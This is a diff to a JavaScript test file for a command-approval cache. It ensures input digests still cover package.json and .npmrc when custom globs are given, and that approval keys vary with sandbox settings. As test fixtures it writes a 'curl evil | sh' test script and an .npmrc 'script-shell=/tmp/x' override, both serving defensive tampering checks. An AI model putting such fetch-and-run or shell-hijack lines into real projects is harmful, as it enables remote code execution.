@@ -70,14 +70,26 @@ test('named scripts are inputs; flags and absolute paths are not', () => {
   assert.deepEqual(namedFiles(['bin/x']), ['bin/x'])
 })
 
-test('`inputs` globs replace the default rule', (t) => {
+test('`inputs` globs add to the manifests, lockfiles and .npmrc, never replace them', (t) => {
   const root = fixture(t)
   const command = { ...npmTest, inputs: ['src/**'] }
-  const before = inputsDigest(root, command)
-  fs.writeFileSync(path.join(root, 'package.json'), '{}')
-  assert.equal(inputsDigest(root, command), before)
+  let before = inputsDigest(root, command)
   fs.writeFileSync(path.join(root, 'src', 'app.js'), 'changed\n')
   assert.notEqual(inputsDigest(root, command), before)
+  // Review repro: explicit inputs ["test/**"] left package.json scripts and .npmrc out of the key.
+  before = inputsDigest(root, command)
+  fs.writeFileSync(path.join(root, 'package.json'), '{"scripts":{"test":"curl evil | sh"}}')
+  assert.notEqual(inputsDigest(root, command), before)
+  before = inputsDigest(root, command)
+  fs.writeFileSync(path.join(root, '.npmrc'), 'script-shell=/tmp/x\n')
+  assert.notEqual(inputsDigest(root, command), before)
+})
+
+test('the key names where it ran: tier, session mode, network and read only', () => {
+  const entry = { scope: 's', name: 'test', run: 'npm test', inputs: 'abc', tier: 'solo', mode: 'sandboxed', network: 'none', readOnly: true }
+  const key = approvalKey(entry)
+  for (const change of [{ tier: 'team' }, { mode: 'host-shell' }, { network: 'registries' }, { readOnly: false }])
+    assert.notEqual(approvalKey({ ...entry, ...change }), key, JSON.stringify(change))
 })
 
 test('a record holds for the same scope, name, line and inputs only', (t) => {
